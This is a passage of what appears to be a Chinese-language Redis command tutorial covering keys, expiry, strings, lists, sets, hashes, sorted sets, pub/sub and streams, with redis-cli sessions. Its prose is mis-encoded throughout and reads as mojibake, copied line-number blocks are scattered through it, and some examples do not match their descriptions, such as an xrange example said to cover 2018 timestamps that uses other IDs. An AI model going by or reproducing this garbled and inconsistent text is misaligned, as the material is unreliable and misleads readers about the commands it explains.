æåºéåè¿è¡æåºï¼ç¶åè¿åæèå­å¨æåºçç»æã\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\næ¥çæ°æ®åºæå¤å°ä¸ª key\n\ndbsize\n\n\n1\n\n\næ¸é¤ææåºçæ°æ®\n\nflushall\n\n\n1\n\n\næ¸é¤å½ååºçæææ°æ®\n\nflushdb\n\n\n1\n\n\næ¥ç reids åå­ä¿¡æ¯ç­\n\ninfo\n\n\n1\n\n\nçæ§ææå®¢æ·åéçå½ä»¤ï¼redis ç¼è¯æ§è¡æåçå½ä»¤ï¼\n\nmonitor\n\n\n1\n\n\n\n# å¤çæ¶é´\n\nç§»é¤é®çè¿ææ¶é´\n\npersist key \n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿æè¿æå¤å°ç§\n\nttl key \n\n\n1\n\n\nç»å®é®å¨æå®çç§æ°åè¿æ\n\nexpire key seconds \n\n\n1\n\n\nå°ç»å®é®çè¿ææ¶é´è®¾ç½®ä¸ºç»å®ç unix æ¶é´æ³\n\nexpireat key timestamp\n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿ææ¶é´è¿æå¤å°æ¯«ç§ï¼è¿ä¸ªå½ä»¤å¨ reids2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npttl key \n\n\n1\n\n\nè®©ç»å®é®å¨æå®çæ¯«ç§æ°ä¹åè¿æï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpire key milliseconds \n\n\n1\n\n\nå°ä¸ä¸ªæ¯«ç§çº§ç²¾åº¦ç unix æ¶é´æ³è®¾ç½®ä¸ºç»å®é®çè¿ææ¶é´ï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# èªå¢åèªå\n\nå°é®å­å¨çå¼ + 1\n\nincr key \n\n\n1\n\n\nå°é®å­å¨çå¼ - 1\n\ndecr key \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æ´æ° amount\n\nincrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼åå»æ´æ° amount\n\ndecrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æµ®ç¹æ° amountï¼è¿ä¸ªå½ä»¤å¨ Redis2.6 ä»¥ä¸çæ¬å¯ç¨\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# å­ç¬¦ä¸² String\n\nå¯ä»¥æ¯å­ç¬¦ä¸²ï¼ç®åçå­ç¬¦ä¸²ãå¤æçå­ç¬¦ä¸²ï¼ä¾å¦ JSONãXMLï¼ï¼ãæ°å­ï¼æ´æ°ãæµ®ç¹æ°ï¼ï¼çè³æ¯äºè¿å¶ï¼å¾çãé³é¢ãè§é¢ï¼ï¼ä½æ¯å¼æå¤§ä¸è½è¶è¿ 512MB\n\nåå»ºä¸ä¸ªé®å¼å¯¹ set key value\n\n127.0.0.1:6379> set a 1234567890\nOK\n\n\n1\n2\n\n\nè·å key å­å¨çå¼ get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\nå°å¼ value è¿½å å°ç»å® key å½åå­å¨çå¼çæ«å°¾ï¼è¿½å æåçåè¿åå¼ä¸ºè¿ä¸ªå­ç¬¦ä¸²çé¿åº¦ (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\nè·åä¸ä¸ªç±åç§»é start è³ end èå´åçææå­ç¬¦ç»æçå­ä¸²ï¼åæ¬ start å end å¨åãgetrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\nå°ä» start åç§»éå¼å§çå­ä¸²è®¾ç½®ä¸ºç»å®å¼ setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# åè¡¨ list\n\nç¨æ¥å­å¨å¤ä¸ªæåºçå­ç¬¦ä¸²ï¼åè¡¨ä¸­çæ¯ä¸ªå­ç¬¦ä¸²ç§°ä¸ºåç´ ï¼elementï¼ï¼ä¸ä¸ªåè¡¨æå¤å¯ä»¥å­å¨ 2^32 -1 ä¸ªåç´ \n\nå°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå³ç«¯ rpush key value [...]\n\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> RPUSH b 7 8\n(integer) 4\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè·å list åç´ æ°é llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> å°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå·¦ç«¯\n\n127.0.0.1:6379> LPUSH b 1 2\n(integer) 6\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> ç§»é¤å¹¶è¿ååè¡¨æå³ç«¯çåç´ \n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> ç§»é¤å¹¶è¿ååè¡¨æå·¦ç«¯çåç´ \n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> è¿ååè¡¨ä¸­åç§»éä¸º offset çåç´  (ä¸æ ä» 0 å¼å§)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> è¿ååè¡¨ä» start åç§»éå° end åç§»éèå´çææåç´ ãåå« start å end æ¬èº«ãlrange key 0 -1 ä¸ºæ¥è¯¢ææ\n\n127.0.0.1:6379> LRANGE b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> å¯¹åè¡¨è¿è¡ä¿®é®ï¼åªä¿çä» start è³ end åç§»éçåç´ ï¼åå« start å endã\n\n127.0.0.1:6379> LTRIM b 1 2\nOK\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå·¦ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> BLPOP c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ \n\nbrpoplpush source-key dest-key timeout -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ ï¼å¦æ source-key ä¸ºç©ºï¼é£ä¹å¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç°ã\n\n\n# éå set\n\nç¨æ¥ä¿å­å¤ä¸ªçå­ç¬¦ä¸²åç´ ï¼ä½ååè¡¨ç±»åä¸ä¸æ ·çæ¯ï¼éåä¸­ä¸åè®¸æéå¤åç´ ï¼å¹¶ä¸éåä¸­çåç´ æ¯æ åºçï¼ä¸è½éè¿ç´¢å¼ä¸æ è·ååç´ \n\nsadd key item[...] -> å°ä¸ä¸ªæå¤ä¸ªåç´ æ·»å å°éåéé¢ï¼å¹¶è¿åè¢«æ·»å åç´ å½ä¸­åæ¬å¹¶ä¸å­å¨äºéåéé¢çåç´ æ°éã\n\nsrem key item[...] -> ä»éåéé¢å é¤ä¸ä¸ªæå¤ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤åç´ çæ°éã\n\nsismember key item -> æ£æ¥åç´ itemæ¯å¦å­å¨äºéåkeyéé¢ã\n\nscard key -> è¿åéååå«çåç´ æ°éã\n\nsmembers key -> è¿åéååå«çææåç´ ã\n\nsrandmember key [count] -> ä»éåééæºçè¿åä¸ä¸ªæå¤ä¸ªåç´ ï¼å½count ä¸ºæ­£æ´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ ä¸ä¼éå¤ï¼å½countä¸ºè´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ å¯è½ä¼åºç°éå¤ã\n\nspop key -> éæºçç§»é¤éåä¸­çä¸ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤çåç´ ã\n\nsmove source-key dest-key item -> å¦æéåsource-keyåå«åç´ itemï¼é£ä¹ä»éåsource-key éé¢ç§»é¤yåç´ itemï¼å¹¶å°åç´ itemæ·»å å°éådest-keyä¸­ï¼å¦æitemæåç§»é¤ï¼é£ä¹å½ä»¤è¿å1ï¼å¦åè¿å0ï¼\n\nsdiff key[...] -> è¿åé£äºå­å¨äºç¬¬ä¸ä¸ªéåãä½ä¸å­å¨äºå¶ä»éåä¸­çåç´ (æ°å­¦ä¸çå·®éè¿ç®)\n\nsdiffstore dest-key key[...] -> å°é£äºå­å¨äºç¬¬ä¸ä¸ªéåä½ä¸å­å¨äºå¶ä»éåçåç´ (æ°å­¦ä¸çå·®éè¿ç®)å­å¨å°dest-key é®éé¢\n\nsinter key[...] -> è¿åé£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)\n\nsinter dest-key key[...] -> é£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\nsunion key[...] -> è¿åé£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)\n\nsunionstore dest-key key[...] -> é£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# æ£å hash åå¸ç±»å\n\n\nhset key-name key value -> åå»ºä¸ä¸ªæ£åå¹¶èµå¼\n\nhget key-name key -> è¿åæå®æ£åé®çå¼\n\nhgetall key-name -> è·åæ£ååå«çææé®å¼å¯¹\n\nhmset key-name key value[key value ...] -> ä¸ºæ£åéé¢çä¸ä¸ªæå¤ä¸ªé®è®¾ç½®å¼\n\nhmget key-name key[...] -> ä»æ£åéé¢è·åä¸ä¸ªæå¤ä¸ªé®çå¼\n\nhlen key-name -> è¿åæ£ååå«çé®å¼å¯¹æ°é\n\nhdel key-name key[...] -> å é¤æ£åéé¢çä¸ä¸ªæå¤ä¸ªé®å¼å¯¹ï¼è¿åæåæ¾å°å¹¶å é¤çé®å¼å¯¹æ°éã\n\nhexists key-name key -> æ£æ¥ç»å®çé®æ¯å¦å­å¨äºæ£åä¸­\n\nhkeys key-name -> è·åæ£ååå«çææé®\n\nhvals key-name -> è·åæ£ååå«çææå¼\n\nhincrby key-name key increment -> å°é®keyå­å¨çå¼å ä¸æ´æ°increment\n\nhincrbyfloat key-name key increment -> å°é®keyå­å¨çå¼å ä¸æµ®ç¹æ°increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æåºéå zset\n\nä¸è½æéå¤çåç´ ï¼èä¸è¿å¯ä»¥æåºï¼å®ååè¡¨ä½¿ç¨ç´¢å¼ä¸æ ä½ä¸ºæåºä¾æ®ä¸åçæ¯ï¼å®ç»æ¯ä¸ªåç´ è®¾ç½®ä¸ä¸ªåæ° (score) ä½ä¸ºæåºçä¾æ®ï¼é»è®¤ååºï¼\n\n\nzadd key score member [score member ...] -> å°å¸¦æç»å®åå¼çæåæ·»å å°æåºéåéé¢\n\nzrem key member[...] -> ä»æåºéåéé¢ç§»é¤ç»å®çæåï¼å¹¶è¿åè¢«ç§»é¤æåçæ°é\n\nzcard key -> è¿åæåºéååå«çæåæ°é\n\nzincrby key increment member -> å°memberæåçåå¼å ä¸increment\n\nzcount key min max -> è¿ååå¼ä»äºmin åmax ä¹é´çæåæ°é\n\nzrank key member -> è¿åæåmemberå¨æåºéåä¸­çæå\n\nzscore key member -> è¿åæåmemberçåå¼\n\nzrange key start stop [withscores] -> è¿åæåºéåä¸­æåä»äºstart å stop ä¹é´çæåï¼å¦æç»å®äºå¯éç withscores éé¡¹ï¼é£ä¹ä¼å°æåçåå¼ä¸å¹¶è¿åãzrange key 0 -1 æ¥è¯¢æææå\n\nzrevrank key member -> è¿åæåºéåéæåmemberçæåï¼æåæç§åå¼ä»å¤§å°å°æå\n\nzrevrange key start stop [withscores] -> è¿åæåºéåç»å®æåèå´åçæåï¼æç§åå¼ä»å¤§å°å°æå\n\nzrangebyscore key min max [withscores] [left offset count] -> è¿åæåºéåä¸­ï¼åå¼ä»äºminåmaxä¹é´çæææå\n\nzrevrangebyscore key max min [withscores] [left offset count] -> è·åæåºéåä¸­åå¼ä»äºminåmaxä¹é´çæææåï¼å¹¶æç§åå¼ä»å¤§å°å°çé¡ºåºæ¥è¿åä»ä»¬ã\n\nzremrangebyrank key start top -> ç§»é¤æåºéåä¸­æåä»äºstart å stop ä¹é´çæåã\n\nzremrangebyscore key min max -> ç§»é¤æåºéåä¸­åå¼ä»äºminåmax ä¹é´çæåã\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹ç»å®çæåºéåæ§è¡ç±»ä¼¼äºéåçäº¤éè¿ç®\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹æå®çæåºéåæ§è¡ç±»ä¼¼äºéåçå¹¶éè¿ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è®¢é / åå¸\n\n\nsubscribe channel[...] -> è®¢éç»å®çä¸ä¸ªæå¤ä¸ªé¢é\n\nunsubscribe channel[...] -> éè®¢ç»å®çä¸ä¸ªæå¤ä¸ªé¢éï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½é¢éï¼é£ä¹éè®¢ææé¢é\n\npublish channel message -> åç»å®çé¢éåéæ¶æ¯\n\npsubscribe pattern[...] -> è®¢éä¸ç»å®æ¨¡å¼ç¸å¹éçææé¢é\n\npunsubscribe pattern[...] -> éè®¢ç»å®çæ¨¡å¼ï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½æ¨¡å¼ï¼é£ä¹éè®¢æææ¨¡å¼ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# Redis5 ä¹ Streams æ°æ®ç±»å\n\nRedis 5.0 å¨æ°çæ°æ®ç±»åï¼streamsï¼å®æ¹æå®å®ä¹ä¸ºï¼ä»¥æ´æ½è±¡çæ¹å¼å»ºæ¨¡æ¥å¿çæ°æ®ç»æãRedis ç streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼è³å°å¨æ¦å¿µä¸å®æ¯ä¸ç§å¨åå­ä¸­è¡¨ç¤ºçæ½è±¡æ°æ®ç±»åï¼åªä¸è¿å®ä»¬å®ç°äºæ´å¼ºå¤§çæä½ï¼ä»¥åææ¥å¿æä»¶æ¬èº«çéå¶ã\n\nå¦æä½ äºè§£ MQï¼é£ä¹å¯ä»¥æ streams å½å MQãå¦æä½ è¿äºè§£ kafkaï¼é£ä¹çè³å¯ä»¥æ streams å½å kafkaã\n\nå¦å¤ï¼è¿ä¸ªåè½æç¹ç±»ä¼¼äº redis ä»¥åç Pub/Subï¼ä½æ¯ä¹æåºæ¬çä¸åï¼\n\n * streams æ¯æå¤ä¸ªå®¢æ·ç«¯ï¼æ¶è´¹èï¼ç­å¾æ°æ®ï¼Linux ç¯å¢å¼å¤ä¸ªçªå£æ§è¡ XREAD å³å¯æ¨¡æï¼ï¼å¹¶ä¸æ¯ä¸ªå®¢æ·ç«¯å¾å°çæ¯å®å¨ç¸åçæ°æ®ã\n\n * Pub/Sub æ¯åéå¿è®°çæ¹å¼ï¼å¹¶ä¸ä¸å­å¨ä»»ä½æ°æ®ï¼è streams æ¨¡å¼ä¸ï¼æææ¶æ¯è¢«æ éæè¿½å å¨ streams ä¸­ï¼é¤éç¨äºæ¾ç¤ºæ§è¡å é¤ï¼XDELï¼ã\n\n * streams ç Consumer Groups ä¹æ¯ Pub/Sub æ æ³å®ç°çæ§å¶æ¹å¼ã\n\n\n# streams æ°æ®ç»æ\n\nstreams æ°æ®ç»ææ¬èº«éå¸¸ç®åï¼ä½æ¯ streams ä¾ç¶æ¯ Redis å°ç®åä¸ºæ­¢æå¤æçç±»åï¼å¶åå æ¯å®ç°çä¸äºé¢å¤çåè½ï¼ä¸ç³»åçé»å¡æä½åè®¸æ¶è´¹èç­å¾çäº§èå å¥å° streams çæ°æ°æ®ãå¦å¤è¿æä¸ä¸ªç§°ä¸º Consumer Groups (æ¶è´¹ç») çæ¦å¿µï¼è¿ä¸ªæ¦å¿µæåç± kafka æåºï¼Redis æä¸ä¸ªç±»ä¼¼å®ç°ï¼å kafka ç Consumer Groups çç®çæ¯ä¸æ ·çï¼åè®¸ä¸ç»å®¢æ·ç«¯åè°æ¶è´¹ç¸åçä¿¡æ¯æµï¼\n\n\n# streams åºç¡\n\nä¸ºäºçè§£ streams çç®çï¼ä»¥åå¦ä½ä½¿ç¨å®ï¼æä»¬åå¿½ç¥æææé«çº§ç¹æ§ï¼åªææ³¨æåæ¾å¨æ°æ®ç»ææ¬èº«ï¼ä»¥åé£äºæä½åè®¿é® streams çå½ä»¤ãè¿åºæ¬ä¸ä¹æ¯å¤§å¤æ°å¶ä» Redis æ°æ®ç±»åå±æçé¨åï¼ä¾å¦ Listsï¼Setsï¼Sorted Sets ç­ãç¶èéè¦æ³¨æçæ¯ï¼Lists ä¹æä¸ä¸ªæ´å¤æçé»å¡å¼ç APIï¼ä¾å¦ BLPOPï¼BRPOP ç­ãstreams è¿æ¹ä¾¿ç API ä¹æ²¡ä»ä¹ä¸åï¼åªæ¯æ´å¤æï¼æ´å¼ºå¤§ï¼æ´çé¼ï¼åï¼ï¼\n\n\n# streams å½ä»¤\n\nåºè¯ä¸å¤è¯´ï¼åä¸æç©ç©è¿ä¸ªå¨æ°çæ°æ®ç±»åãstreams è¿ä¸ªæ°æ®ç±»åå¯¹åºæå¦ä¸ 13 ä¸ªæä½å½ä»¤ï¼ææå½ä»¤é½ä»¥ "X" å¼å¤´ï¼\nXADD\n\n * ç¨æ³ï¼XADD key ID field string [field string â¦]\n\n * æ­£å¦å¶åï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥æ·»å çï¼ç» streams è¿½å ï¼appendï¼åé¢æå°è¿ï¼streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼ä¸ä¸ªæ°ç entryï¼å Java éç Map ç±»ä¼¼ï¼Redis éç streams ä¸­çæ°æ®ä¹ç§°ä¸º entryï¼ã\n\n * keyï¼çå«ä¹å°±æ¯åä¸ç±»å streams çåç§°ï¼\n\n * ID: streams ä¸­ entry çå¯ä¸æ è¯ç¬¦ï¼å¦ææ§è¡ XADD å½ä»¤æ¶ï¼ä¼ å¥æå·ï¼*ï¼ï¼é£ä¹ï¼ID ä¼èªå¨çæï¼ä¸èªå¨çæç ID ä¼å¨æ§è¡ XADD åè¿åï¼é»è®¤çæç ID æ ¼å¼ä¸º millisecondsTime+sequenceNumberï¼å³å½åæ¯«ç§çº§å«çæ¶é´æ³å ä¸ä¸ä¸ªèªå¢åºå·å¼ï¼ä¾å¦ "1540013735401-0"ãå¹¶ä¸æ§è¡ XADD æ¶ï¼ä¸æ¥åå°äºæç­äºä¸ä¸æ¬¡æ§è¡ XADD ç IDï¼å¦åä¼æ¥éï¼ERR The ID specified in XADD is equal or smaller than the target stream top itemï¼\n\n * field&stringï¼æ¥ä¸æ¥å°±æ¯è¥å¹²ç» field stringãå¯ä»¥æå®çè§£ä¸ºè¡¨ç¤ºå±æ§ç json ä¸­ç key-valueãä¾å¦ï¼æä¸ streams ç key å½åä¸º userInfoï¼ä¸æä¸ªç¨æ·ä¿¡æ¯ä¸º {"username":"afei", "password":"123456"}ï¼é£ä¹æ§è¡ XADD å½ä»¤å¦ä¸ï¼\n\n127.0.0.1:6379> xadd userInfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\nç±äºå½ä»¤ä¸­ ID å­æ®µçå¼æ¯ * ï¼æä»¥èªå®çæ IDï¼1594456377383-0 å°±æ¯èªå¨çæç IDã XADD å½ä»¤ä¹æ¯ææ¾ç¤ºæå® IDï¼ä¾å¦ï¼XADD key 0-2 field stringã\n\néè¦æ³¨æçæ¯ï¼ID çæ¶é´æ³é¨åæ¯é¨ç½² Redis æå¡å¨çæ¬å°æ¶é´ï¼å¦æåçæ¶éåæ¨ä¼æä¹æ ·ï¼å¦æåçæ¶éåæ¨ï¼çæç ID çæ¶é´æ³é¨åå°±æ¯åæ¨åçæ¶é´ï¼ç¶åå ä¸è¿ä¸ªæ¶é´çéå¢åºåå·ãä¾å¦å½åæ¶é´æ³ 1540014082060ï¼ç¶åè¿æ¶ååçäºæ¶éåæ¨ï¼ä¸åæ¨ 5msï¼é£ä¹æ¶é´æ³å°±æ¯ 1540014082055ãåè®¾ä»¥åå·²ç»çæäº 1540014082055-0ï¼1540014082055-1ï¼é£ä¹è¿æ¬¡ç±äºæ¶éåæ¨ï¼çæç ID å°±æ¯ 1540014082055-2ãæä»¥åè®¸èªå¨çæç ID å¨åçæ¶éåæ¨æ¶å°äºä¸æ¬¡ç IDï¼ä½æ¯ä¸åè®¸æ¾ç¤ºæå®ä¸ä¸ªå°äºä¸æ¬¡ç IDã\n\nå¦ææä»¬ä»¥ç¸åç key æå¥ä¸éï¼ä»ä¸ä¼åæ®éç key-value ä¸æ ·åæ¿æ¢ï¼èæ¯å¨ç¸å key ç»´æ¤è¿ä¸ä¸ªåè¡¨ã\n\nxdel\n\n * ç¨æ³ï¼XDEL key ID [ID â¦]\n   å XADD ç¸åï¼è¿æ¯å½ä»¤ç¨æ¥ä» streams ä¸­å é¤è¥å¹²ä¸ª entryï¼å¹¶ä¸ä¼è¿åå®éå é¤æ°ï¼è¿ä¸ªå é¤æ°å¯è½ååæ° ID ä¸ªæ°ä¸ç­ï¼å ä¸ºæäº ID è¡¨ç¤ºçæ¶æ¯å¯è½ä¸å­å¨ãæ§è¡å½ä»¤å¦ä¸ï¼ç¬¬äºä¸ªåæ° ID æ¯ä¸å­å¨çï¼æä»¥ XDEL çè¿åç»ææ¯ 1ï¼\n\n127.0.0.1:6379> xdel userInfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * ç¨æ³ï¼XLEN key\n   å¾å¥½çè§£ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥è¿åç¸å key çæ°éï¼ä¸é¢åè¯´ç¸å key æ¯ä¸ä¼è¦ççï¼æ¯ç»´æ¤äºä¸ä¸ªåè¡¨ï¼æä»¥è¿ä¸ªæ¯ç¸å key åè¡¨ç sizeãæ§è¡å¦ä¸ï¼\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams ä¸ç§æ¥è¯¢æ¨¡å¼\n\nredis æä¾äºä¸ç§æ¥è¯¢ streams æ°æ®çæ¨¡å¼ï¼\n\n * èå´æ¥è¯¢ï¼å ä¸º streams çæ¯ä¸ª entryï¼å¶é»è®¤çæç ID æ¯åºäºæ¶é´ä¸éå¢çï¼\n\n * çå¬æ¨¡å¼ï¼ç±»æ¯ linux ä¸­ç tailf å½ä»¤ï¼å®æ¶æ¥æ¶æ°å¢å å° streams ä¸­ç entryï¼ä¹æç¹åä¸ä¸ªæ¶æ¯ç³»ç»ï¼äºå®ä¸ç¬èè®¤ä¸ºå®å°±æ¯åé´äº kafkaï¼ï¼\n\n * æ¶è´¹èç»ï¼å³ Consumer Groupsï¼ç¹æ®ççå¬æ¨¡å¼ãä»ä¸ä¸ªæ¶è´¹èçè§åº¦æ¥ç streamsï¼ä¸ä¸ª streams è½è¢«ååºå°å¤ä¸ªå¤çæ¶æ¯çæ¶è´¹èï¼å¯¹äºä»»æä¸æ¡æ¶æ¯ï¼åä¸ä¸ªæ¶è´¹èç»ä¸­åªæä¸ä¸ªæ¶è´¹èå¯ä»¥å¤çï¼å kafka çæ¶è´¹èç»å®å¨ä¸æ ·ï¼ãè¿æ ·è¿è½å¤æ¨ªåæ©å®¹æ¶è´¹èï¼ä»èæåå¤çæ¶æ¯çè½åï¼èä¸éè¦åªè®©æè®©ä¸ä¸ªæ¶è´¹èå¤çæææ¶æ¯ã\n\nxrange\n\n * ç¨æ³ï¼XRANGE key start end [COUNT count]\n   è¿ä¸ªå½ä»¤å±äºç¬¬ 1 ç§æ¨¡å¼ï¼å³åºäºèå´æ¥è¯¢ãè¿ä¸ªå½ä»¤ç¨æ¥è¿å streams æä¸ªé¡ºåºèå´ä¸çåç´ ï¼start åæ°æ¯æ´å°ç IDï¼end åæ°æ¯æ´å¤§ç IDãæä¸¤ä¸ªç¹æ®ç ID ç¨ç¬¦å· "-" å "+" è¡¨ç¤ºï¼ç¬¦å· "-" è¡¨ç¤ºæå°ç IDï¼ç¬¦å· "+" è¡¨ç¤ºæå¤§ç IDï¼\n\n127.0.0.1:6379> XRANGE user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nXRANGE è¿è½å®ç°éåæä¸ªèå´åºé´çåè½ï¼ä¾å¦ææ³éå 2018-10-20 å·æ°å¢çç¨æ·ä¿¡æ¯ãé¦åå¾å° 2018-10-20 00:00:00 å¯¹åºçæ¶é´æ³ä¸º 1539964800000ï¼åå¾å° 2018-10-20 23:59:59 å¯¹åºçæ¶é´æ³ä¸º 1540051199000ï¼ç¶åæ§è¡å¦ä¸å½ä»¤ï¼\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * ç¨æ³ï¼XREVRANGE key end start [COUNT count]\n   è¿ä¸ªå½ä»¤ä¹å±äºç¬¬ 1 ç§æ¨¡å¼ï¼ä¸å XRANGE ç¸åï¼è¿åä¸ä¸ªéåºèå´ãend åæ°æ¯æ´å¤§ç IDï¼start åæ°æ¯æ´å°ç ID\n\nxread\n\n * ç¨æ³ï¼XREAD [COUNT count] [BLOCK milliseconds] 